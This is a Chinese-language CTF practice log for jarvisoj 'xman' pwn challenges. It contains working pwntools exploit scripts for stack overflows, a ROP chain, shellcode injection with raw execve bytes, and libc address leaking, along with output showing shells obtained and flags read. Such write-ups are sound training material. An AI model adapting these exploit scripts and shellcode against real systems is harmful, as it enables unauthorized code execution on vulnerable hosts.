# jarvisoj 练习记录

## PWN

### xman-level 0
一个64位下的栈溢出：
``` c
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL); //溢出点
}
```
开启了NX保护
``` bash
trump@ubuntu:~/Desktop/xman$ checksec level0
	[*] '/home/trump/Desktop/xman/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
trump@ubuntu:~/Desktop/xman$ 

```
考虑使用ROP进行exp：
```
[---buf---][--ebp--][--gadget--][--binsh--][--system--]
```
exp如下：
``` python
#!/usr/bin/python

from pwn import *

def exploit():
    global io
    system_addr = 0x0000000000400596
    
    payload   = 'A' * 0x80
    payload  += 'A' * 0x8        # ebp 
    payload  += p64(system_addr)  # system_addr
    
    sleep(0.5)
    io.sendline(payload)
    
    # get shell
    io.interactive()

def exploit2():
    global io
    system_addr = 0x0000000000400460
    binsh_addr  = 0x0000000000400684
    gadget_addr = 0x0000000000400663
    
    payload   = 'A' * 0x80
    payload  += 'A' * 0x8         # ebp 
    payload  += p64(gadget_addr)  # pop rdi;ret
    payload  += p64(binsh_addr)   # system_addr
    payload  += p64(system_addr)   # system_addr

    
    sleep(0.5)
    io.sendline(payload)
    # get shell
    io.interactive()

if __name__ == '__main__':
    target_elf = './level0'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9881'

    context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x00000000004005BF
        b *0x00000000004005A6''')
    else:
        io = remote(target_host, target_port)
    
    exploit2()
```


### xman-level 1

用IDA查看，read函数明显的栈溢出，缓冲区为0x88,而最大可读0x100字节，所以可以溢出
``` c
char buf; // [esp+0h] [ebp-88h]
printf("What's this:%p?\n", &buf); //此处泄漏出buf的地址
return read(0, &buf, 0x100u); //溢出点
```
这里同时printf泄漏出了buf的地址，这个有用。

同时使用checksec查看程序的保护：
``` bash
sandy@ubuntu:~/Desktop/xman$ checksec level1 
[*] '/home/trump/Desktop/xman/level1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
程序没有开启任何保护，可以直接调到shellcode中进行执行。

当前程序的布置为：
```
|-------------|-------|-------|
    buf          ebp     ret
```
现在知道shellcode的地址（buf的地址，可泄漏出来），以及返回地址，所以利用方式也很清晰了，将shellcode布置到栈中，同时将返回地址覆盖为buf的地址，程序返回时可以直接跳入返回地址之中，如下：
```
|-------------------------|
V                         | 
|-------------|-------|-------|
    buf          ebp     ret

```

完整的利用脚本如下：
``` python
#!/usr/bin/python

from pwn import *

def get_buf_addr():
    global io
    io.recvuntil('this:')
    buf_addr = int(io.recvuntil('?').strip('?'), 16)
    print(hex(buf_addr))
    return buf_addr

def exploit():
    global io
    ret_addr = get_buf_addr()
    
    shellcode  = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
    payload    = shellcode
    payload   += 'A' * (0x88-len(shellcode))
    payload   += 'A' * 0x4     # ebp
    payload   += p32(ret_addr) # ret addr
    
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf = './level1'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9877'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    #LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, '''b *0x080484AC
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    exploit()

```

最后拿到flag：
``` bash
trump@ubuntu:~/Desktop/xman$ python temp_exp.py 
[*] '/home/trump/Desktop/xman/level1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done
0xff97af40
[*] Switching to interactive mode

$ ls
flag
level1
$ cat flag
CTF{82c2aa534a9dede9c3a0045d0fec8617}
$  

```

## xman-level 2

是一个栈溢出的题目，用IDA看很明显的溢出，可以使用栈溢出：
``` c
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  system("echo Input:");
  return read(0, &buf, 0x100u); //栈溢出
}
```
checsec一下，发现有NX保护
``` bash
trump@ubuntu:~/Desktop/xman$ checksec level2
[*] '/home/trump/Desktop/xman/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
trump@ubuntu:~/Desktop/xman$ 
```
所以不能直接在stack上布置shellcode，需要使用ROP技术调到类似于system("/bin/sh")这样的地方执行，IDA中`ALT+7`看一下导入表，有system的地址，同时shift+F12查看string，发现有binsh的字符串，故直接利用就可以。
``` python
payload   = 'A' * 0x88
payload  += 'A' * 0x4 
payload  += p32(system_addr) # ret addr
payload  += 'A' * 0x4        # ebp --> push ebp 
payload  += p32(binsh_addr)  # binsh
```
需要注意，32位程序使用栈传递参数，这个和64位使用寄存器然后再栈的方式不太一样。
调用程序后，首先会push ebp，所以需要将ret地址排在前面，
`[ebp][ret][argvs]`

完整的exp如下：
``` python
#!/usr/bin/python

from pwn import *

def exploit():
    global io
    system_addr = 0x08048320
    binsh_addr  = 0x0804A024
    
    payload   = 'A' * 0x88
    payload  += 'A' * 0x4 
    payload  += p32(system_addr) # ret addr
    payload  += 'A' * 0x4        # ebp --> push ebp 
    payload  += p32(binsh_addr)  # binsh
    
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf = './level2'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9878'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x08048475
           x/sg 0x0804A024        
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    exploit()

```
执行exp获取flag
``` bash
trump@ubuntu:~/Desktop/xman$ python level2_exp.py 
[*] '/home/trump/Desktop/xman/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done
[*] Switching to interactive mode
Input:
$ cat flag
CTF{1759d0cbd854c54ffa886cd9df3a3d52}
$  
```

### xman-level2 x64
与level0类似，使用ROP直接过


### xman-level3
给了libc，但是没有给binsh和system，通过泄漏write函数的got表，得到libc的偏移，进而计算出system和'/bin/sh'的地址，核心代码如下：
``` python 
def leak_addr():
    '''
    leak system addr and binsh addr
    '''
    global io
    global elf
    global libc

    payload  = 'A' * (0x88+0x4) 
    payload += p32(elf.plt['write']) # plt of write
    payload += p32(0x08048484)       # main function -> the ret addr of write
    payload += p32(1)                # fd
    payload += p32(elf.got['write']) # 
    payload += p32(4)                # len
    
    io.recvuntil('Input:\n')
    io.sendline(payload)
    write_addr = u32(io.recv(4))
    
    libc_offset  = write_addr  - libc.symbols['write']
    system_addr  = libc_offset + libc.symbols['system'] 
    binsh_addr   = libc_offset + libc.search('/bin/sh').next()
    
    return (system_addr, binsh_addr)
    

def exploit():
    global io
    system_addr, binsh_addr = leak_addr()
    
    print(hex(system_addr))
    print(hex(binsh_addr))
    payload   = 'A' * (0x88 + 0x4)
    payload  += p32(system_addr) # ret addr
    payload  += 'A' * 0x4        #  
    payload  += p32(binsh_addr)  # binsh
    
    io.sendline(payload)
    
    # get shell
    io.interactive()

```

几个细节需要记录一下以后注意：
1. 栈的布置（32位）：
```
[padding][返回地址][下一个返回地址][参数N][参数N-1]...[参数1]
```
2. got表的延迟绑定技术情况下，需要泄漏那些已经使用过的函数才行。
3. pwntools中的ELF模块直接可对elf程序的plt、got表和字符串进行搜索，其中可执行的程序的got和symbols是一致的，libc只有symbols。掉用一个程序，跳转到其plt表。
4. 搜索binsh字符串的方法
``` python
from pwn import *
libc = ELF('xxx')
libc.search('/bin/sh').next()
```

### xman-level3_64
在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。

使用通用gadget控制write三个参数的值
``` python
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)
```

问题：
plt 和 got表的关系到底是怎样的，ret指令为什么放plt就行，放got表就不行

## 一些需要注意的坑：

* 32位的程序在64位上的机器上没法跑，需要安装一下 `sudo apt-get install libc6-i386 libc6:i386`
* gdb调试不熟悉啊，x/nxg addr 打印内存内容



## IDA技巧
shift + F12 : 调出string界面
alt + 7 : imports界面

## GDB技巧

